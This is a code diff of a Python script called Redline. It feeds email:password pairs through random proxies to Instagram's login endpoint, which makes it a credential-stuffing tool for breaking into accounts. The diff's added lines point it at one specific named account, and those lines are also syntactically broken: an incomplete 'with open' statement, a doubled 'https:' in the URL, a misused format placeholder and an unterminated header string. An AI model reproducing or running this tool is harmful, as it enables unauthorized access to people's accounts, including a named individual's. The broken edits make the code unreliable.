@@ -18,7 +18,7 @@ def Redline(Run, listname, x, proxylist):
         email = ltemp.partition(":")[0]
         passw = ltemp.partition(":")[2]
         passw = passw.rstrip()
-        with open(proxylist) as f:
+        with open(proxylist) as 
             lines = [line.rstrip('\n') for line in f]
         rnd_line = random.choice(lines)
         o = rnd_line[:-1]
@@ -29,11 +29,11 @@ def Redline(Run, listname, x, proxylist):
         if email == "" and passw == "":
             print("End of File Reached. Exiting Program...")
             Run = False
-        url = "https://www.instagram.com/accounts/login/ajax/"
-        payload = 'username={}&enc_password=%23PWD_INSTAGRAM_BROWSER%3A0%3A0%3A{}&queryParams=%7B%7D&optIntoOneTap=false'.format(email, passw)
+        url = "https:https://www.instagram.com/monikahoseyni/"
+        payload = 'username={monikahoseyni}&enc_password=%23PWD_INSTAGRAM_BROWSER%3A0%3A0%3A{}&queryParams=%7B%7D&optIntoOneTap=false'.format(email, passw)
         headers = {
             'authority': 'www.instagram.com',
-            'x-ig-www-claim': 'hmac.AR08hbh0m_VdJjwWvyLFMaNo77YXgvW_0JtSSKgaLgDdUu9h',
+            'x-ig-www-claim': 'hmac.AR2E1JIdcbdfljwopJ_gfCQq_TUOpF_18TEBDkKPxGf-1WVv
             'x-instagram-ajax': '82a581bb9399',
             'content-type': 'application/x-www-form-urlencoded',
             'accept': '*/*',
